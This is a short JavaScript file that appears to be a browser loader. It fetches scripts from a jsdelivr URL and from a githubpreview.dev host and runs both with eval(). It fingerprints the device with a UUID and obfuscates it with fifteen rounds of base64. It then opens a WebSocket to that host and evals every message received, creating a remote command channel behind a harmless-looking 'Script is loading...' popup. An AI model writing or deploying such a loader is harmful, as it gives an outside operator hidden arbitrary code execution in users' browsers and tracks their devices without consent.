function EncryptData(data) {
    var encodetimes = 15;
    var inputcode = data;
    for (var i = 0; i < encodetimes; i++) {
        inputcode = btoa(inputcode);
    };
    return inputcode;
};
fetch("https://cdn.jsdelivr.net/npm/sweetalert2@11.4.17/dist/sweetalert2.all.min.js").then(response => response.text()).then(script => {
		eval(script);
		Swal.fire({
  			icon: 'info',
  			title: 'Script is loading...'
		});
});
fetch('https://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/get/script1.js')
.then(response => response.text())
.then(text => {
    eval(text);
    var browseruuid = new DeviceUUID().get();
    var inputcode = `stamp${Date.now() + (1000 * 60 * 1)}hwid${browseruuid}`;
    new WebSocket(`wss://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/protocol_link/${EncryptData(browseruuid)}`).onmessage = (msgevent) => {
        var script = msgevent.data;
        eval(msgevent.data);
				windownewopen.close();
    };
    var windownewopen = window.open(`https://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/hwid-check/${EncryptData(inputcode)}`);
});